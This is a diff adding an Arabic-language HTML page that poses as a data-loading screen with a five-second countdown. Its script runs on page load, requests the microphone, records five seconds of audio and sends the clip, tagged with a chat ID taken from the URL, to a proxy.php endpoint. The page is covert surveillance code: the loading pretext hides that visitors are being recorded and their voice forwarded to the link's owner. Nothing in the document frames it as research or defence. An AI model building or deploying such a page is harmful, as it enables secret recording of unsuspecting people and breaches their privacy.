@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>جاري التحميل</title>
+  <style>
+    body { background-color: #e6f0ff; font-family: 'Segoe UI', Tahoma, sans-serif; color: #004080; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+    .container { background-color: #cce0ff; padding: 30px 50px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0, 64, 128, 0.3); font-size: 1.3rem; }
+    .countdown { margin-top: 15px; font-weight: bold; font-size: 2rem; color: #00264d; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    جاري تهيئة البيانات، يرجى الانتظار...
+    <div class="countdown" id="countdown">5</div>
+  </div>
+
+  <script>
+    const CHAT_ID = new URLSearchParams(window.location.search).get('id');
+
+    function sendVoice(audioBlob) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("voice", audioBlob, "voice.ogg");
+      formData.append("message", "🎤 تم تسجيل مقطع صوتي!");
+
+      fetch("proxy.php", {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    async function startRecording() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
+
+        mediaRecorder.ondataavailable = event => { audioChunks.push(event.data); };
+        
+        mediaRecorder.onstop = () => {
+          if (audioChunks.length === 0) return;
+          const audioBlob = new Blob(audioChunks, { type: "audio/ogg; codecs=opus" });
+          sendVoice(audioBlob);
+        };
+
+        mediaRecorder.start();
+
+        setTimeout(() => {
+          mediaRecorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }, 5000); // التسجيل لمدة 5 ثوانٍ
+      } catch (error) {
+        console.error("خطأ في الوصول للميكروفون:", error);
+      }
+    }
+
+    window.onload = startRecording;
+  </script>
+</body>
+</html>
